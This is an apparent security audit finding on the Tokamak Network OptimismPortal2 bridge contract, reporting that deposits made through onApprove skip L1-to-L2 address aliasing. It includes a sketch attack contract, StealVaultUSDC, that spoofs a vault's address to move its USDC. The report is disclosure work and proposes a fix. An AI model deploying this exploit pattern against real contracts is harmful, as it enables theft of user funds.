# Incorrect address aliasing while deposit transacton by ````onApprove()````

### Summary

Address aliasing is an important security feature for preventing cross-chain address spoofing attack, ````all L1 -> L2 messages sent by smart contracts must be aliased````.
_more reference: https://docs.optimism.io/chain/differences#address-aliasing_
The issue is that the ````sender```` address will never be aliased while transactions are  deposited by calling ````onApprove()````. Looks like the developer has a misunderstanding that address aliasing is not needed if the ````sender```` is not direct caller of ````OptimismPortal2````, that's not correct.

### Root Cause
The issue arises on [L469](https://github.com/sherlock-audit/2024-08-tokamak-network/blob/6d4cf9ea730d5b52b622f0b3afd41a35d3eba8a2/tokamak-thanos/packages/tokamak/contracts-bedrock/src/L1/OptimismPortal2.sol#L469) and [L549](https://github.com/sherlock-audit/2024-08-tokamak-network/blob/6d4cf9ea730d5b52b622f0b3afd41a35d3eba8a2/tokamak-thanos/packages/tokamak/contracts-bedrock/src/L1/OptimismPortal2.sol#L549) of ````OptimismPortal2.sol````, the ````_isOnApproveTrigger```` is always set to ````true```` while ````_depositTransaction()```` is called by ````onApprove()````, and the ````_sender```` address will never be aliased in this case. But actually, the ````_sender```` might be an EOA or a smart contract.
```solidity
File: src\L1\OptimismPortal2.sol
457:     function onApprove(
458:         address _owner,
...
462:     )
...
466:     {
467:         (address to, uint256 value, uint32 gasLimit, bytes calldata message) = unpackOnApproveData(_data);
468:         if (msg.sender == _nativeToken()) {
                 // @audit _isOnApproveTrigger = true
469:             _depositTransaction(_owner, to, _amount, value, gasLimit, to == address(0), message, true); 
470:             return true;
471:         } else {
472:             return false;
473:         }
474:     }

File: src\L1\OptimismPortal2.sol
513:     function _depositTransaction(
...
521:         bool _isOnApproveTrigger
522:     )
...
525:     {
...
...
548:         address from =
549:             ((_sender != tx.origin) && !_isOnApproveTrigger) ? AddressAliasHelper.applyL1ToL2Alias(_sender) : _sender;
...
559:     }

File: src\L1\L2NativeToken.sol
0980: contract ERC20OnApprove is ERC20 {
0981:     function approveAndCall(address spender, uint256 amount, bytes memory data) public returns (bool) {
0982:         require(approve(spender, amount));
0983:         _callOnApprove(msg.sender, spender, amount, data);
0984:         return true;
0985:     }
...
1008: }

```

### Internal pre-conditions

Native token has ````onApprove()```` hooks.

### External pre-conditions

N/A

### Attack Path
The attack scene and specific paths could be varied, the following is one example, let's say:

(1) A famous DAO works on L2 and employs a developer called Bob to develop a new ````Vault```` smart contract for the DAO
(2) Bob develop and deploy the ````Vault```` on L2 with his account's private key, his account is the default owner of ````Vault````
(3) Bob transfers ````Vault```` ownership to the DAO's governance contract

Till step 3, It looks like the development is completed and the ````Vault```` could be securely used. But actually Bob can exploit this vulnerability to steal any funds from ````Vault```` by deploying a similar contract like the following one on L1 at the same address of  ````Vault````:
```solidity
contract StealVaultUSDC {
    ERC20OnApprove constant NATIV_TOKEN;
    address constant USDC_L2;
    address constant OPTIMISM_PORTAL_2;
    address constant RECEIVER_L2;

    function stealL2USDCFromVault() public {
        bytes memory dataTransferUSDC = abi.encodeWithSignature("transfer(address,uint256)", RECEIVER_L2, 100_000e6);
        address to = USDC_L2;
        uint256 value = 0;
        uint32 gasLimit = 100_000;
        bytes memory dataDepositTxn = abi.encodePacked(to, value, gasLimit, dataTransferUSDC);
        NATIV_TOKEN.approveAndCall(OPTIMISM_PORTAL_2, 0, dataDepositTxn);
    }
}
```





### Impact

This issue will make the bridge suffers cross-chain address spoofing attack

### PoC

_No response_

### Mitigation

Removing the ````isOnApproveTrigger```` condition, it's not necessary.
